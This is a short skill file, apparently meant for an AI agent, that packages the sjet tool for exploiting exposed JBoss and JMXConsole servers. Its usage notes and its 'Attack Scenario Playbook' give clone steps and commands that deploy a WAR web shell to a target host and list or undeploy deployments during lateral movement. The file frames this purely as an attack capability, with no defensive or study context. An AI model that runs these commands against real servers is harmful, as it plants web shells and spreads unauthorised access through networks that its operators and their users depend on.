---
name: sjet-jboss
description: "sjet: JBoss and JMXConsole exploitation. Signals: lateral movement, psexec, JBoss deployment, undeploy, list."
zh-signals: "sjet: JBoss/JMXConsole 利用。信号:横向移动,psexec,JBoss 部署,卸载,列表。"
when-to-use: >-
  Use when a JBoss or JMXConsole instance is exposed and you want to deploy a WAR
  web shell, list deployments, or undeploy during lateral movement.
---

# sjet

- Attack Category: C31 Remote Service Lateral Movement
- Upstream Repository: https://github.com/h0ng10/sjet
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/h0ng10/sjet && cd sjet
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 sjet.py 10.0.0.5 8080 deploy shell.war` | JBoss deployment |
| `undeploy shell` | Undeploy |
| `list` | List |

## Attack Scenario Playbook

### JBoss/JMXConsole exploitation

```bash
python3 sjet.py 10.0.0.5 8080 deploy cmd.war
# Deploy a WAR shell
```

## Notes

JBoss JMX exploitation tool.